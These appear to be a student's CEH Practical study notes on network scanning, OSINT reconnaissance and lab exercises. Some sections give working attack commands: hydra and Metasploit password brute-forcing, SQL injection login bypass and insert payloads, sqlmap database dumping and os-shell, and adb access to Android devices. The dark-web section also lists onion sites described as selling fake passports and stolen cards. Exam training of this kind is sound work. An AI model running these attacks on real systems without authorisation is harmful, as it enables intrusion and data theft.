CEH Practical notes

########
Enumeration
########

Parrot IP: 192.168.230.132
(found via ifconfig)

netdiscover -r 192.168.230.0/24

NMAP

OUTPUT TO TEXT FILE

-oN /home/attacker/Desktop ScanResults (or something)

Scan by hostname
nmap www.geeksforgeeks.com

nmap google.com

Scan by IP address

nmap 192.168.230.132

VERBOSE option

nmap -v 192.168.230.132

MULTIPLE HOSTS

nmap 192.168.230.132 127.0.0.1
(host ip's separated by a space)

WHOLE SUBNET

nmap 192.168.230.0/24

SPECIFIC RANGE

nmap 192.168.230.1-25

DETECT FIREWALL SETTINGS

sudo nmap -sA 192.168.230.132
(ACK scan)

ID HOSTNAMES

sudo nmap -sL 192.168.230.132

SCAN MULTIPLE IP FROM FILE

nmap -iL input.txt

can be IP, or hostname (bing.com, udemy.com etc.)

SCANS USING DIFFERENT PROTOCOLS

nmap -sU <domain name>

The -sU flag is used to perform a UDP scan, which allows the user to discover open UDP ports and services on a target system.

nmap -sn <domain name> 

the -sn flag performs a ping scan using ICMP requests to a target host or network to determine if a host is up or not.

nmap -sS is the TCP SYN scan which is stealthy and efficient method of scanning for open ports. "half scan" because it just sends SYN and waits for response (SYN-ACK) then sends an RST packet to reset the connection. (good for bypassing firewalls)

nmap -p 80 443 21 <domain name> OR nmap -p 1-80 <domain name>

the -p flag is for specifying ports pr ranges of ports to scan on a host

nmap -A <domain name>

the -A flag is for aggressive scanning, it will scan all of the things and take a long time, or appear to be a DDoS attack or otherwise tip off your target that it's being scanned.

DETERMINE OS

nmap -O <domain name>

Shows you what OS is running on the host.

SKIP PING CHECK

nmap -Pn <domain name>

skips the step that checks if the host is online or not. Good for checking hosts that might block ICMP requests.

CHECK SOFTWARE VERSION

nmap -sV <domain name>

checks the software version of the services running on the scanned ports

FIND DOMAIN CONTROLLER

nmap -p 389 -T4 -A -v --script ldap-rootdse nnn.nnn.nnn.nnn/nn

FIND SMB SERVER

common SMB ports: 137, 138, 139 & 445

hack password using john the ripper or hyrda

EX: hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb

-L –> denotes the path of username list

-P –> is to denote the path of the password

Once the Metasploit opens type:

use auxiliary/scanner/smb/smb_login
msf exploit (smb_login)>set rhosts 192.168.1.118
msf exploit (smb_login)>set user_file /root/Desktop/user.txt
msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
msf exploit (smb_login)>set stop_on_success true
msf exploit (smb_login)>exploit
Here,

auxiliary/scanner/smb/smb_login—> is a module we will use to attempt to login

/root/Desktop/user.txt –> is the path of a text file which is the resident of all the possible usernames.

/root/Desktop/pass.txt –> is the path of a text file in which all the possible passwords resides.

Now, the process of dictionary attack will start. Thus, you will attain the username and password of your victim.

########
ZENMAP
########
-use if you don't feel comfortable with NMAP

########
Remote Desktop Protocol Port 3389
########

CMD: 

ip config
shows your IP address

net user
shows all accounts who have logged in, check against list of registered users.


########
Hacking Webpages
########

--------
WPScan
--------

wpscan --url https://google.com

Brute force password attacking:

wpscan --url <web address> -U <username> -P <path to wordlist>

OR

wpscan --url <web address> -usernames <path to username wordloist> -passwords <path to password wordlist>

--------
Hydra
--------

hydra -h

will give a list of flags and options that you can use as a reference when working with hydra.

hydra -L userlist.txt -p butterfly 10.10.137.76 ssh

tests the users in userlist.txt using the password "butterfly" to try and ssh into 10.10.137.76

hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.76 ssh

tests the users in userlist.txt using the passwords listed in "rockyou.txt" to try and ssh into 10.10.137.76


==================================================================================
===================How would you?=================================================
==================================================================================
1) Identify the Operating system of a server?

A: 	nmap -sV <target IP>/24 (gives services) *THEN* nmap -O <target IP> (gives operating system)
	nmap -A <target IP>/24 (takes long time because it's an aggressive scan, gives 	ports/services/operating system)
	
2) Audit the accounts on a computer joined to a domain?
	
A:	Use RDP to log in (note credentials). Open CMD and use "net user" command to list the user 	accounts	

3) Identify a machine with the RDP port open?

A:	RDP port is 3389, either look at previous scan results for a system with this port open or scan for this port using nmap.
	nmap -Pn -p -sV 3389 <Target IP>
	
4) Decrypt a hex file when given the encryption algorithm?

A:	Open CrypTool --> Encrypt/Decrypt --> select the matching algorithm and use the creds to answer the question (get file.txt or file1.txt // ftp <ip address>)

5) Find secret information hidden in a text file?

A:	To Display Hidden Data- ("magic" is the password in this case)
	snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
	
6) Hack a wordpress login?

A: 	wpscan --url http://<IP of site>:8080/CEH -u <username> -P passwdlist.txt

	**PREFERRED**
	msfconsole
	use auxilliary/scanner/http/wordpress_login_enum
	show options
	set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
	set RHOSTS <TARGET IP>
	set RPORT 8080 (target port)
	set TARGETURI http://<IP of site>:8080/CEH
	set USERNAME <username>
	
7) Crack an MD5 hash?

A:	paste the hash to www.hashes.com

8) Identify the IP of the machine performing a DoS from a pcap?

A:	open the pcap in wireshark and look for the source IP with hundreds of thousands of packets
	tcp.flags.syn == 1

9) Determine the number of attackers in a DDoS?

A:	Wireshark --> tcp.flags.syn == 1 and tcp.flags.ack == 0

10) Crack weak FTP credentials?

A:	hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<IP of TARGET>

	hydra -l <user> -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<IP of TARGET> (if username is provided)
	
	**COMMAND** get flag.txt
	
11) Find the server running server 2019 with RDP open?

A:	nmap -A <target ip>/24 (results will show this info)
	nmap -Pn -p -sV 3389 <Target IP>/24 (results will show hosts with RDP open) THEN nmap -O <List of IP with RDP open>
	
12) Bypass authentication using SQL injection and do a DSSS attack using SQL map?

A: 	1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

13) Determine if creds were shared in plaintext by analyzing a pcap file

A:	 Wireshark --> http.request.method == POST

14) Determine which hosts are alive? OR How many?

A:	nmap -sn <target ip>/24 (only checks if it's alive)

15) Decrypt an encrypted file/volume with the password?

A:	Use Veracrypt

16) Decrypt a file encrypted with RC4 encryption using 14 as the key length

A: 	Use Cryptool to decrypt by selecting the appropriate encryption type and setting the key length to 14

17) Identify the machine running android?

A:	Find the machine with port 5555 open.

	adb connect <ip address>:5555
	
18) Decode encoded text?

A:	Use BCTextEncoder (windows) and paste the encoded message into the bottom window and decode.

19) Perform priviledge escalation on Ubuntu?

A:	nmap -sV -p 22 <IP Address>/24 (to find a host with ssh open)
	ssh <username>@<IP Address>
	whoami (checks user)
	sudo -i (use the password you logged in with)
	whoami (check again to see if it changed)
	find . -name <filename> (find the flag)
	cat <path to flag>
	
20) Find the FQDN of a machine over the network?

A:	nmap -p 389 -T4 -A -v --script ldap-rootdse nnn.nnn.nnn.nnn/nn
	nmap -p389 -sV -iL <target_list>
	nmap -p389 -sV <target IP> -Pn (this gives the domain, and host name separately, combine them to get the FQDN HOST.DOMAIN.NAME)
	
21) Perform a vuln scan on a host? Where would you find the severity score?

A:	nmap -Pn --script vuln <IP ADDRESS>  (this will reveal any applicable CVEs, check them on the web for their severity score.)

	Vuln score will be 0.0-10.0 (probably 10 though)
	
22) Covertly Access an android device?

A:	adb connect <ip address>:5555
	adb shell
	ls
	cd sdcard
	ls
	cd scan
	ls (see the elf files?)
	exit (to leave the shell)
	adb pull /sdcard/scan <destination path>
	ent -h (or apt install ent, if it's not on the machine)
	ent evil.elf (to calculate the entropy)
	sha384sum <filename> (to generate the sha 384 hash)
	
23) Do an IDOR?

A:	Do SQL injection authentication bypass
	IDOR
	note the id number in the URL, and change it until you access the correct profile.
	
24) Determine if POST or GET method is vulnerable?

A:	OWASP ZAP
	dismiss the option to persist the zap session
	Automated scan
	input the URL of the site to be tested
	click "attack"
	Click "alerts" tab
	Look for the red flag with SQL injection, there you will find the vulnerable request type 

##################################################################################
#######################ILABS######################################################
##################################################################################

########
Google Dorking:
########

intitle:<term> returns results with the keyword in the page's title

site:<domain> returns results from the specified site.

filetype:<file extension> returns results of the specified file type, this can be combined with other operators to search for documentation hidden in the target domain.

cache: This operator allows you to view cached version of the web page. [cache:www.eccouncil.org]- Query returns the cached version of the website www.eccouncil.org

allinurl: This operator restricts results to pages containing all the query terms specified in the URL. [allinurl: EC-Council career]—Query returns only pages containing the words “EC-Council” and “career” in the URL

inurl: This operator restricts the results to pages containing the word specified in the URL [inurl: copy site:www.eccouncil.org]—Query returns only pages in EC-Council site in which the URL has the word “copy”

allintitle: This operator restricts results to pages containing all the query terms specified in the title. [allintitle: detect malware]—Query returns only pages containing the words “detect” and “malware” in the title

inanchor: This operator restricts results to pages containing the query terms specified in the anchor text on links to the page. [Anti-virus inanchor:Norton]—Query returns only pages with anchor text on links to the pages containing the word “Norton” and the page containing the word “Anti-virus”

allinanchor: This operator restricts results to pages containing all query terms specified in the anchor text on links to the page. [allinanchor: best cloud service provider]—Query returns only pages in which the anchor text on links to the pages contain the words “best,” “cloud,” “service,” and “provider”

link: This operator searches websites or pages that contain links to the specified website or page. [link:www.eccouncil.org]—Finds pages that point to EC-Council’s home page

related: This operator displays websites that are similar or related to the URL specified. [related:www.eccouncil.org]—Query provides the Google search engine results page with websites similar to eccouncil.org

info: This operator finds information for the specified web page. [info:eccouncil.org]—Query provides information about the www.eccouncil.org home page

location: This operator finds information for a specific location. [location: EC-Council]—Query give you results based around the term EC-Council

########
Video Search recon
########

Open Youtube and copy video link

Go to https://mattw.io/youtube-metadata/ 

paste in the video link and parse the metadata dump.

You can use other video search engines such as Google videos (https://www.google.com/videohp), Yahoo videos (https://in.video.search.yahoo.com), etc.; video analysis tools such as EZGif (https://ezgif.com), VideoReverser.com (https://www.videoreverser.com) etc.; and reverse image search tools such as TinEye Reverse Image Search (https://tineye.com), Yahoo Image Search (https://images.search.yahoo.com), etc. to gather crucial information about the target organization.

########
FTP Recon $ Search
########

https://www.searchftps.net - this crawls open FTP servers and searches for the provided keywords

Other tools: 

https://www.freewareweb.com

########
IOT recon
########

https://www.shodan.io

Other Tools:

https://search.censys.io/

########
Domain and subdomain enum with Netcraft
########

https://www.netcraft.com

Top right: Resources --> Research Tools --> Site report

network--> domain --> site -- Shows subdomains, netblock, and OS

########
Personal Info gathering using Peekyou
########

Peekyou.com

You can also use Spokeo (https://www.spokeo.com), pipl (https://pipl.com), Intelius (https://www.intelius.com), BeenVerified (https://www.beenverified.com), etc., people search services to gather personal information of key employees in the target organization.

########
Email list creation
########

theHarvester

theHarvester -d microsoft.com -l 200 -b baidu

In this command, -d specifies the domain or company name to search, -l specifies the number of results to be retrieved, and -b specifies the data source.

Here, we specify Baidu search engine as a data source. You can specify different data sources (e.g., Baidu, bing, binaryedge, bingapi, censys, google, linkedin, twitter, virustotal, threatcrowd, crtsh, netcraft, yahoo, etc.) to gather information about the target.

########
Deep/Dark web searching
########

Open and connect to TOR using the tor browser.

You can also anonymously explore the following onion sites using Tor Brower to gather other relevant information about the target organization:

The Hidden Wiki is an onion site that works as a Wikipedia service of hidden websites. (http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki)

FakeID is an onion site for creating fake passports (http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion)

Cardshop is an onion site that sells cards with good balances (http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion)

You can also use tools such as ExoneraTor (https://metrics.torproject.org), OnionLand Search engine (https://onionlandsearchengine.com), etc. to perform deep and dark web browsing.

########
Determine Target OS through footprinting
########

https://search.censys.io/?q=

search for target org. Select a host and view the OS details.

########
Perform Footprinting through Social Media Sites
########

Parrot OS

theHarvester -d eccouncil -l 200 -b linkedin

lists all employees found on linkedin for eccouncil

########
Social Media Search using sherlock
########

Parrot OS

cd sherlock

python3 sherlock satya nadella

python3 sherlock <target name>

You can also use tools such as Social Searcher (https://www.social-searcher.com), UserRecon (https://github.com), etc. to gather additional information related to the target company and its employees from social networking sites.

########
Website Footprinting
########
Ping

command prompt. Type ping www.certifiedhacker.com -i 2 -n 1 and press Enter. Here, we set the TTL value to 2 and the -n value to 1 to check the life span of the packet.

Parrot OS

python3 photon.py -u http://www.certifiedhacker.com and press Enter to crawl the target website for internal, external and scripts URLs.

-u: specifies the target website (here, www.certifiedhacker.com).

the results are stored in the Photon folder.

python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback and press Enter to crawl the target website using URLs from archive.org.

You can further explore the Photon tool and perform various other functionalities such as the cloning of the target website, extracting secret keys and cookies, obtaining strings by specifying regex pattern, etc. Using this information, the attackers can perform various attacks on the target website such as brute-force attacks, denial-of-service attacks, injection attacks, phishing attacks and social engineering attacks.

########
Website info gathering using Central Ops
########

https://centralops.net

in the search bar enter the target IP or domain (www.certifiedhacker.com)
Address lookup, Domain Whois record will be shown as the search result.
Scroll-down to view information such as Network Whois record and DNS records, as shown in the screenshots. The attackers can use this information to perform injection attacks and other web application attacks on the target website.

You can also use tools such as Website Informer (https://website.informer.com), Burp Suite (https://portswigger.net), Zaproxy (https://www.zaproxy.org), etc. to perform website footprinting on a target website.

########
Web Data Extractor Pro
########

Install and Launch Web Data Extractor Pro

Start new session and enter the URL into the "start" field and run the extraction.

You can also use other web spiders such as ParseHub (https://www.parsehub.com), SpiderFoot (https://www.spiderfoot.net), etc. to extract the target organization’s data.

########
Mirror a Target Website using HTTrack Web Site Copier
########

open winhttrack copier

alter settings to include all files and enter the website URL. Begin copying. Once the copy operation is complete you can navigate the copied site the same as a live site and test exploits against it.

You can also use other mirroring tools such as Cyotek WebCopy (https://www.cyotek.com), etc. to mirror a target website.

########
Info Gathering using GRecon
########

ParrotOS

go to Grecon directory

Command: python3 grecon.py

Set target (site.com) : certifiedhacker.com

GRecon searches for available subdomains, sub-subdomains, login pages, directory listings, exposed documents, WordPress entries and pasting sites and displays the results.

########
Gather a Wordlist from the Target Website using CeWL
########

Parrot OS

root directory

Command: cewl -d 2 -m 5 https://www.certifiedhacker.com

-d represents the depth to spider the website (here, 2) and -m represents minimum word length (here, 5).

this unique wordlist can be written directly to a text file. To do so, type 
cewl -w wordlist.txt -d 2 -m 5 https://www.certifiedhacker.com 
and press Enter.

########
Gather Information about a Target by Tracing Emails using eMailTrackerPro
########

install and open eMailTrackerPro 

start new trace and paste email header info. View the report for detailed information

########
Perform Whois Lookup using DomainTools
########

https://whois.domaintools.com

enter the target domain or IP and search.

This search result reveals the details associated with the URL entered, www.certifiedhacker.com, which includes organizational details such as registration details, name servers, IP address, location, etc., as shown in the screenshots.

You can also use other Whois lookup tools such as SmartWhois (https://www.tamos.com), Batch IP Converter (http://www.sabsoft.com), etc. to extract additional target Whois information.

########
Gather DNS Information using nslookup Command Line Utility and Online Tool
########

CMD

command: nslookup

result: DNS server name and ip address.

In the nslookup interactive mode, type set type=a and press Enter. Setting the type as “a” configures nslookup to query for the IP address of a given domain.

query: www.certifiedhacker.com

result: 
	Name: certifiedhacker.com
	Address: 162.241.216.11
	Aliases: www.certifiedhacker.com
	
Since the result returned is non-authoritative, you need to obtain the domain's authoritative name server.

Type set type=cname and press Enter. The CNAME lookup is done directly against the domain's authoritative name server and lists the CNAME records for a domain.

search certifiedhacker.com

This returns the domain’s authoritative name server (ns1.bluehost.com), along with the mail server address (dnsadmin.box5331.bluehost.com), as shown in the screenshot.

set type=a <enter>

search: ns1.bluehost.com

Result:
	Name: ns1.bluehost.com
	Address: 162.159.24.80
	
The authoritative name server stores the records associated with the domain. So, if an attacker can determine the authoritative name server (primary name server) and obtain its associated IP address, he/she might attempt to exploit the server to perform attacks such as DoS, DDoS, URL Redirection, etc.

You can also perform the same operations using the NSLOOKUP online tool. Conduct a series of queries and review the information to gain familiarity with the NSLOOKUP tool and gather information.

========
NSLOOKUP online tool
========

http://www.kloth.net/services/nslookup.php

Once the site opens, in the Domain: field, enter certifiedhacker.com. Set the Query: field to default [A (IPv4 address)] and click the Look it up button to review the results that are displayed.

You can also use DNS lookup tools such as DNSdumpster (https://dnsdumpster.com), DNS Records (https://network-tools.com), etc. to extract additional target DNS information.

########
Perform Reverse DNS Lookup using Reverse IP Domain Check and DNSRecon
########

https://www.yougetsignal.com

Select Reverse IP Domain Check

search target domain, the results show other domains hosted by the same server as the target.

========
DNS Recon
========

Parrot OS

cd dnsrecon

chmod +x ./dnsrecon.py

./dnsrecon.py -r 162.241.216.0-162.241.216.255 
	-and press Enter to locate a DNS PTR record for IP addresses between 162.241.216.0 - 	162.241.216.255.
	-Here, we will use the IP address range, which includes the IP address of our target, that is, 	the certifiedhacker.com domain (162.241.216.11), which we acquired in the previous steps.
	-The -r option specifies the range of IP addresses (first-last) for reverse lookup brute force.

########
Gather Information of Subdomain and DNS Records using SecurityTrails
########

https://securitytrails.com/

a lot of bullshit with this one. Does provide historical info though.

You can also use DNSChecker (https://dnschecker.org), and DNSdumpster (https://dnsdumpster.com), etc. to perform DNS footprinting on a target website.

########
Network Footprinting - Locate the network range
########

https://www.arin.net/about/welcome/region

in the search bar, enter the IP address of the target organization (here, the target organization is certifiedhacker.com, whose IP is 162.241.216.11), and then click the Search button.

########
Perform Network Tracerouting in Windows and Linux Machines
########

Windows:

tracert <target domain>

view the hops to the target

tracert /?

view the different options the tool provides

tracert -h 5 www.certifiedhacker.com

perform the trace, but with only 5 maximum hops allowed.

========
Traceroute in linux
========

ParrotOS

traceroute www.certifiedhacker.com
to view the hops that the packets made before reaching the destination.

You can also use other traceroute tools such as VisualRoute (http://www.visualroute.com), Traceroute NG (https://www.solarwinds.com), etc. to extract additional network information of the target organization.

########
Recon-ng
########

ParrotOS

CD to root dir

Command: recon-ng

Command: help

Command: marketplace install all
	(ignore errors)
	
Command: modules search
	You will be able to perform network discovery, exploitation, reconnaissance, etc. by loading the required modules.
	
Type the workspaces command and press Enter. This displays the commands related to the workspaces.

Create a workspace in which to perform network reconnaissance. In this task, we shall be creating a workspace named CEH.

To create the workspace, type the command: 
workspaces create CEH
	and press Enter. This creates a workspace named CEH.
	
Enter 
workspaces list
	This displays a list of workspaces (along with the workspace added in the previous step) that are present within the workspaces databases.
	
Add a domain in which you want to perform network reconnaissance.

Type the command:
db insert domains
	and press Enter.

In the domain (TEXT) option type certifiedhacker.com and press Enter. In the notes (TEXT) option press Enter. This adds certifiedhacker.com to the present workspace.

You can view the added domain by issuing the 
show domains
	command.
	
Harvest the hosts-related information associated with certifiedhacker.com by loading network reconnaissance modules such as brute_hosts, Netcraft, and Bing.

Type 
modules load brute
	and press Enter to view all the modules related to brute forcing. 

In this task, we will be using the recon/domains-hosts/brute_hosts module to harvest hosts

To load the recon/domains-hosts/brute_hosts module, type the: 
modules load recon/domains-hosts/brute_hosts
	command and press Enter.
	
Now that the modules and target domain have been loaded, enter command:

run

and press enter

You have now harvested the hosts related to certifiedhacker.com using the brute_hosts module. You can use other modules such as Netcraft and Bing to harvest more hosts.

To resolve hosts using the Bing module, use the following commands:

back
modules load recon/domains-hosts/bing_domain_web
run

Now, perform a reverse lookup for each IP address (the IP address that is obtained during the reconnaissance process) to resolve to respective hostnames.

Type 

back
modules load reverse_resolve
	command and press Enter to view all the modules associated with the reverse_resolve keyword. In this task, we will be using the recon/hosts-hosts/reverse_resolve module.

Type the 
modules load recon/hosts-hosts/reverse_resolve
	command and press Enter to load the module.
	
run

(this begins reverse lookup)

Once done with the reverse lookup process, type the 

show hosts

	command and press Enter. This displays all the hosts that are harvested so far, as shown in the screenshot.
	
Command: back
	this takes you back to the CEH terminal
	
Generate a report

command: modules load reporting
command: modules load reporting/html

Observe that you need to assign values for CREATOR and CUSTOMER options while the FILENAME value is already set, and you may change the value if required.

Type:

options set FILENAME /home/attacker/Desktop/results.html
	and press Enter. By issuing this command, you are setting the report name as results.html and the path to store the file as Desktop.
options set CREATOR [your name] (here, Jason)
	and press Enter.
options set CUSTOMER Certifiedhacker Networks
	(since you have performed network reconnaissance on certifiedhacker.com domain) and press Enter.
run
	(to run the report)
	
========
Personnel recon using recon-ng
========

Parrot OS

Command: recon-ng

command: workspaces create reconnaissance

Type modules load recon/domains-contacts/whois_pocs and press Enter. This module uses the ARIN Whois RWS to harvest POC data from Whois queries for the given domain.

Type the info command and press Enter to view the options required to run this module.

Type options set SOURCE facebook.com and press Enter to add facebook.com as a target domain.

command: run

Note the contact names

========
Subdomain Enum with recon-ng
========

ParrotOS

Command: recon-ng

To extract a list of subdomains and IP addresses associated with the target URL, we need to load the recon/domains-hosts/hackertarget module.

Command: modules load recon/domains-hosts/hackertarget

Command: options set SOURCE certifiedhacker.com 

Command: run 
	The recon/domains-hosts/hackertarget module searches for list of subdomains and IP addresses associated with the target URL and returns the list of subdomains and their IP addresses.
	
########
Domainify
########

Use domainfy to check with the existing domains using words and nicknames. 
Command: domainfy -n [Domain Name] -t all (here, the target domain name is ECCOUNCIL)

-n: specifies a nickname or a list of nicknames to be checked. -t: specifies a list of top-level domains where nickname will be searched.

The tool will retrieve all the domains along with their IP addresses related to the target domain. Using this information, attackers can further find vulnerabilities in the subdomains of the target website and launch web application attacks.

Use searchfy to check for the existence of a given user details on different social networking platforms such as Github, Instagram and Keyserverubuntu. 
Command: searchfy -q "target user name or profile name" (here, the target user name or profile is Tim Cook and it is searched in all the social media platforms)

-q: specifies the query or list of queries to be performed.

The searchfy will search the user details in the social networking platforms and will provide you with the existence of the user. These profile links of the target user can be used by the attackers to perform social engineering attacks.

Similarly, you can use following OSRFramework packages to gather more information about the target:

usufy - Gathers registered accounts with given usernames.
mailfy – Gathers information about email accounts
phonefy – Checks for the existence of a given series of phones
entify – Extracts entities using regular expressions from provided URLs

########
Footprinting using FOCA
########

The FOCA new project wizard appears, follow the steps below:

Enter a project name in the Project name field (here, Project of www.eccouncil.org).
Enter the domain website in the Domain website field (here, www.eccouncil.org).
You can leave the optional Alternative domains field empty.
Under the Folder where to save documents field, click on the Folder icon. When the Browse For Folder pop up window appears, select the location to save the document that is extracted by FOCA (here, Desktop) and click OK.
Leave the other settings to default and click the Create button.
Screenshot

The Project saved successfully pop-up appears, click OK to close it.

Screenshot

To extract the information of the targeted domain, select all three search engines (Google, Bing, and DuckDuckGo) present under Search engines section. Similarly, under Extensions section, click All option to choose all the given extensions and then click the Search All button.

Screenshot

The Search All button automatically toggles the Stop button, and begins gathering information on the target domain in the middle pane.

After the scans are completed, the Stop button automatically toggles back to the Search All button. The gathered result on the Metadata associated with the target domain appears, as shown in the screenshot

Screenshot

To view the file information stored in the sub-domain, right-click on any URL and click Link(s) --> Open in browser from the context menu.

Navigate back to the FOCA window and click the Network node to expand the node in the left pane of the window to view the network structure.

The domain we used does not have associated clients or servers.

Screenshot

If the domain has any of the associated Clients or Servers, it displays the related information.

Expand the Domains node and click on the target domain (here, eccouncil.org) to view the domain-related information.

Screenshot

In the right-pane, click Crawling tab and then click Google crawling button.

Google's crawling functionality begins crawling the target website. Once the crawling is completed, the results appear in the lower pane.

The results include the domains obtained through scanning along with their severity as low, medium or high is displayed, as shown in the screenshot. Using this information, attackers can further find vulnerabilities in the target domain and exploit them to launch web application attacks.

Screenshot

Now, expand the Document Analysis node; further expand the Metadata Summary node. Here, information regarding users, folders, printers, software, etc. is displayed.


########
Footprinting using BillCipher
########

In the Parrot Terminal window, 

Command: cd BillCipher  

to navigate to the BillCipher directory.

BillCipher application initializes. In the Are you want to collect information of website or IP address? option, 

type website and press Enter.

In the Enter the website address option, 
type the target website URL (here, www.certifiedhacker.com) and press Enter.

BillCipher displays various available options that you can use to gather information regarding a target website.

In the What information would you like to collect? option, type 1 to choose the DNS Lookup option and press Enter.

In the Do you want to continue? option, type Yes and press Enter to continue.

Screenshot

Are you want to collect information of website or IP address? option appears, type website and press Enter.

In the Enter the website address option, type the target website URL (here, www.certifiedhacker.com) and press Enter.

Now, type 3 and press Enter to choose the GeoIP Lookup option from the available information gathering options.

In the Do you want to continue? option, type Yes and press Enter to continue.

Screenshot

Are you want to collect information of website or IP address? option appears, type website and press Enter.

In the Enter the website address option, type the target website URL (here, www.certifiedhacker.com) and press Enter.

Now, type 4 and press Enter to choose the Subnet Lookup option from the available information gathering options.

In the Do you want to continue? option, type Yes and press Enter to continue.

Screenshot

Are you want to collect information of website or IP address? option appears, type website and press Enter.

In the Enter the website address option, type the target website URL (here, www.certifiedhacker.com) and press Enter.

Now, type 6 and press Enter to choose the Page Links option from the available information gathering options.

The result appears, displaying a list of Visible links and Hidden links of the target website, as shown in the screenshot.

In the Do you want to continue? option, type Yes and press Enter to continue.

Are you want to collect information of website or IP address? option appears, type website and press Enter.

In the Enter the website address option, type the target website URL (here, www.certifiedhacker.com) and press Enter.

Now, type 8 and press Enter to choose the HTTP Header option from the available information gathering options.

The result appears, displaying information regarding the HTTP header of the target website, as shown in the screenshot.

In the Do you want to continue? option, type Yes and press Enter to continue.

Are you want to collect information of website or IP address? option appears, type website and press Enter.

In the Enter the website address option, type the target website URL (here, www.certifiedhacker.com) and press Enter.

Now, type 9 and press Enter to choose Host Finder option from the available information gathering option.

The result appears, displaying information regarding the IP address of the target website, as shown in the screenshot.

########
Footprinting using OSINT framework
########

Open any web browser (here, Mozilla Firefox). In the address bar of the browser place your mouse cursor, type https://osintframework.com/ and press Enter.

OSINT Framework website appears; you can observe the OSINT tree on the left side of screen, as shown in the screenshot.

Screenshot

Clicking on any of the categories such as Username, Email Address, or Domain Name will make many useful resources appear on the screen in the form of a sub-tree.

Click the Username category and click to expand the Username Search Engines and Specific Sites sub-categories.

You can observe a list of OSINT tools filtered by sub-categories (Username Search Engines and Specific Sites sub-categories).

From the list of available tools under the Username Search Engines category, click on the NameCheckr tool to navigate to the NameCheckr website.

The NameCheckr website appears, as shown in the screenshot.

Screenshot

Close the current tab to navigate back to the OSINT Framework webpage.

Similarly, you can explore other tools from the list of mentioned tools under the Username Search Engines and Specific Sites sub-categories.

Now, click the Domain Name category, and its sub-categories appear. Click to expand the Whois Records sub-category.

A list of tools under the Whois Records sub-category appears; click the Domain Dossier tool.

whois.jpg

The Domain Dossier website appears, as shown in the screenshot.

The Domain Dossier tool generates reports from public records about domain names and IP addresses to help solve problems, investigate cybercrime, or just to better understand how things are set up.

Screenshot

Close the current tab to navigate back to the OSINT Framework webpage.

Now, click the Metadata category and click the FOCA tool from a list of available tools.

foca.jpg

The FOCA website appears, displaying information about the tool along with its download link, as shown in the screenshot.

Screenshot

Similarly, you can explore other available categories such as Email Address, IP Address, Social Networks, Instant Messaging, etc. and the tools associated with each category. Using these tools, you can perform footprinting on the target organization.

This concludes the demonstration of performing footprinting using the OSINT Framework.

You can also use footprinting tools such as Recon-Dog (https://www.github.com), Grecon (https://github.com), Th3Inspector (https://github.com), Raccoon (https://github.com), Orb (https://github.com), etc. to gather additional information related to the target company.

########
Nmap scanning
########

ParrotOS

In the terminal window:
command: nmap -sn -PR [Target IP Address] (here, the target IP address is 10.10.1.22) and press Enter.

-sn: disables port scan and -PR: performs ARP ping scan.

========
UDP Ping (instead of ICMP which is commonly filtered)
========
Command: nmap -sn -PU [Target IP Address], (here, the target IP address is 10.10.1.22) and press Enter. The scan results appear, indicating the target Host is up, as shown in the screenshot.

-PU: performs the UDP ping scan.

The UDP ping scan sends UDP packets to the target host; a UDP response means that the host is active. If the target host is offline or unreachable, various error messages such as “host/network unreachable” or “TTL exceeded” could be returned.

========
ICMP Ping ECHO
========
Command: nmap -sn -PE [Target IP Address], (here, the target IP address is 10.10.1.22) and press Enter. The scan results appear, indicating that the target Host is up, as shown in the screenshot.

-PE: performs the ICMP ECHO ping scan.

========
Ping ECHO SWEEP (range of IPs)
========

Command: nmap -sn -PE [Target Range of IP Addresses] (here, the target range of IP addresses is 10.10.1.10-23) and press Enter


========
Timestamp Ping
========

Command: nmap -sn -PP [Target IP Address], (here, the target IP address is 10.10.1.22) and press Enter. 

The scan results appear, indicating the target Host is up, as shown in the screenshot.

-PP: performs the ICMP timestamp ping scan.

ICMP timestamp ping is an optional and additional type of ICMP ping whereby the attackers query a timestamp message to acquire the information related to the current time from the target host machine.

Apart from the aforementioned network scanning techniques, you can also use the following scanning techniques to perform a host discovery on a target network.

ICMP Address Mask Ping Scan: This technique is an alternative for the traditional ICMP ECHO ping scan, which are used to determine whether the target host is live specifically when administrators block the ICMP ECHO pings.

# nmap -sn -PM [target IP address]

TCP SYN Ping Scan: This technique sends empty TCP SYN packets to the target host, ACK response means that the host is active.

# nmap -sn -PS [target IP address]

TCP ACK Ping Scan: This technique sends empty TCP ACK packets to the target host; an RST response means that the host is active.

# nmap -sn -PA [target IP address]

IP Protocol Ping Scan: This technique sends different probe packets of different IP protocols to the target host, any response from any probe indicates that a host is active.

# nmap -sn -PO [target IP address]

########
Host discovery using Angry IP Scanner
########

Windows

Open Angry IP scanner

